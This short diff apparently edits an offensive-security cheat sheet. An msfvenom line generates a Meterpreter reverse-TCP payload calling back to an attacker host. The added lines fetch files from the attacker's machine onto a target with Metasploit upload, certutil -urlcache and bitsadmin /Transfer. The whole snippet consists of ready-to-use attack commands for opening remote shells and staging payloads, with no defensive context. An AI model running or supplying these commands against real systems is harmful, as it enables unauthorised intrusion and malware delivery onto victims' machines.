@@ -11,3 +11,7 @@
     # linux x64
         msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.0.0 LPORT=443 EXITFUNC=thread -f ps1
 
+# Download file from host machine
+    metasploit: upload <your dir> <target dir>
+    certutil -urlcache -split -f http://<your ip>/ <target dir>
+    bitsadmin /Transfer myJob http://<your ip>/ <target dir>
